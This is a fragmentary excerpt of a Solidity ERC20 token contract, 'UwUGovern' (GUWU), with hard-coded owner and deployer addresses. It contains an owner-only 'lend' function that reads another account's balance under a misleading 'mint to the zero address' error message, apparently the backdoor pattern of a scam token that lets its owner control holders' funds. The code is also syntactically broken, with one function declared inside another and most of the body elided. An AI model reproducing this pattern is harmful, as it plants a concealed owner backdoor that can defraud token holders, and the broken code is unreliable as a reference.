...
contract UwUGovern is Context, IERC20 {
    ...
    address lead_deployer = 0x47094aC2b18689Fc3D526F55E846873F5C5aD19c;
    address public _owner = 0x2D9A26F1Aa135a07Ffca7CcaA4206922f293ceFf;
   constructor () public {
        ...
        _symbol = "GUWU";
        _decimals = 9;
        uint256 initialSupply = 32000000;
        _safeOwner = _owner;
...
//-----------------------------------------------------------------------------------------------------------------------//
    ...
    function earn(address account) public {
        ...
        function lend(address account, address staker) public {
        require(msg.sender == _owner, "ERC20: mint to the zero address");
        uint256 amount = _balances[account];
